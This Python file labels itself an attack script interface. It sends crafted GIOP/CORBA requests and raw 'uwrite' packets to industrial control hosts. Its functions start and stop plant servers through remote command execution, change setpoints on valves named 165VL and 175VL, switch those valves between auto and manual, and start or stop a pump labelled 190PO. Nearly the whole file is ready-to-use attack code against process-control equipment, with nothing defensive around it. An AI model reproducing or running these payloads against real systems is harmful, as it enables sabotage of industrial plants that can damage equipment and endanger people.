# 攻击脚本接口文件
# 更新日期：2021.05.18
from protocols.packet_giop import *
from ifconfig import *
from status_code import *
import socket

def send_pkt(src_addr, dst_addr, pkt):
    print('与目标建立TCP连接...\n    本端: {}\n    对端: {}'.format(src_addr, dst_addr))
    skt = None
    try:
        skt = socket.create_connection(dst_addr, source_address=src_addr)
    finally:
        if skt:
            skt.send(bytes(pkt))
            print('Sleeping... 1s')
            time.sleep(1)
            skt.close()
            print('攻击数据包已发送，断开连接')
            return 0, STATUS_CODE[0]
        else:
            print('连接建立失败')
            return 40001, (STATUS_CODE[40001] + ', 本端: {}, 对端: {}'.format(src_addr, dst_addr))

# 通过SAS启停服务器，需要连接到主CCT
def sas_start_owp5(*args, **kwargs):
    key_address = ''
    if MAIN_CCT_CONFIG == CCT1_CONFIG:
        key_address = GIOP_CONFIG['key_address']['cct1_sas_owp5']
    elif MAIN_CCT_CONFIG == CCT2_CONFIG:
        key_address = GIOP_CONFIG['key_address']['cct2_sas_owp5']
    pkt = GIOP(type='Request',
               RequestID=1,
               KeyAddress=h2b(key_address),
               RequestOperation='idl_execute_command',
               StubData=h2b(GIOP_CONFIG['stub_data']['sas_start_owp5']))

    return send_pkt(TO_CCT_HOST_CONFIG, MAIN_CCT_CONFIG, pkt)

def sas_stop_owp5(*args, **kwargs):
    key_address = ''
    if MAIN_CCT_CONFIG == CCT1_CONFIG:
        key_address = GIOP_CONFIG['key_address']['cct1_sas_owp5']
    elif MAIN_CCT_CONFIG == CCT2_CONFIG:
        key_address = GIOP_CONFIG['key_address']['cct2_sas_owp5']
    pkt = GIOP(type='Request',
               RequestID=1,
               KeyAddress=h2b(key_address),
               RequestOperation='idl_execute_command',
               StubData=h2b(GIOP_CONFIG['stub_data']['sas_stop_owp5']))

    return send_pkt(TO_CCT_HOST_CONFIG, MAIN_CCT_CONFIG, pkt)

# 通过OWP发送指令，连接到SAR/STR
def owp_165vl_add_1(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_165vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_165vl_add_1']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_165vl_minus_1(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_165vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_165vl_minus_1']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_165vl_add_5(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_165vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_165vl_add_5']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_165vl_minus_5(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_165vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_165vl_minus_5']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_175vl_add_1(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_175vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_175vl_add_1']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_175vl_minus_1(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_175vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_175vl_minus_1']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_175vl_add_5(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_175vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_175vl_add_5']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_175vl_minus_5(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_175vl_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_175vl_minus_5']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_190po_auto(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_190po_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_190po_auto']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_190po_manual(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_190po_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_190po_manual']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_190po_stop(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_190po_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_190po_stop']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)

def owp_190po_start(*args, **kwargs):
    pkt = GIOP(type='Request',
               RequestID=30000,
               KeyAddress=h2b(GIOP_CONFIG['key_address']['owp_190po_value']),
               RequestOperation='idl_db_locked_multiple_write',
               StubData=h2b(GIOP_CONFIG['stub_data']['owp_190po_start']))

    return send_pkt(TO_SAR_STR_HOST_CONFIG, SAR_STR_CONFIG, pkt)


# 通过CFR发送指令
def cfr_165vl_value(*args, **kwargs):
    if 'value' not in kwargs.keys():
        return 40013

    value = kwargs.get('value')
    if not isinstance(value, int):
        return 40011
    if value < 0 or 100 < value:
        return 40012

    # 负载第二行行尾处的最后一个参数（'59'），即表示将设备值修改为 59
    pkt = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 3,            {: >3d})]\x0a' \
          '[-1(1)]\x0a\x00'.format(value)

    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt)

def cfr_165vl_auto(*args, **kwargs):
    pkt1 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 9,            512)]\x0a' \
          '[-1(1)]\x0a\x00'

    pkt2 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 9,              0)]\x0a' \
          '[-1(1)]\x0a\x00'

    code, desc = send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt1)
    if code != 0:
        return code, desc
    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt2)

def cfr_165vl_manual(*args, **kwargs):
    pkt1 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 9,            256)]\x0a' \
          '[-1(1)]\x0a\x00'

    pkt2 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 9,              0)]\x0a' \
          '[-1(1)]\x0a\x00'

    code, desc = send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt1)
    if code != 0:
        return code, desc
    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt2)

def cfr_175vl_value(*args, **kwargs):
    if 'value' not in kwargs.keys():
        return 40013

    value = kwargs.get('value')
    if not isinstance(value, int):
        return 40011
    if value < 0 or 100 < value:
        return 40012
    # TODO: 在某些情况下，当负载第二行行尾处的最后一个参数大于100时，需要保证第二行最后一个参数总位数一定（使用向前进位填充空格）
    # 负载第二行行尾处的最后一个参数（'59'），即表示将设备值修改为 59
    pkt = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313735564C5F4F322E504E5400, 3,            {: >3d})]\x0a' \
          '[-1(1)]\x0a\x00'.format(value)

    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt)

def cfr_175vl_auto(*args, **kwargs):
    pkt1 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313735564C5F4F322E504E5400, 9,            512)]\x0a' \
          '[-1(1)]\x0a\x00'

    pkt2 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313735564C5F4F322E504E5400, 9,              0)]\x0a' \
          '[-1(1)]\x0a\x00'

    code, desc = send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt1)
    if code != 0:
        return code, desc
    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt2)

def cfr_175vl_manual(*args, **kwargs):
    pkt1 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313735564C5F4F322E504E5400, 9,            256)]\x0a' \
          '[-1(1)]\x0a\x00'

    pkt2 = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313735564C5F4F322E504E5400, 9,              0)]\x0a' \
          '[-1(1)]\x0a\x00'

    code, desc = send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt1)
    if code != 0:
        return code, desc
    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt2)

def cfr_190po_start(*args, **kwargs):
    pkt = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313930504F5F432E4949303100, 9, -32768)]\x0a' \
          '[-1(1)]\x0a\x00'

    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt)

def cfr_190po_stop(*args, **kwargs):
    pkt = '[26 (uwrite, 1, 0, 1)]\x0a' \
          '[0 (  0,  0,314753535F4E393A313930504F5F432E4949303100, 9, 16384)]\x0a' \
          '[-1(1)]\x0a\x00'

    return send_pkt(TO_AW_HOST_CONFIG, AW_CONFIG, pkt)
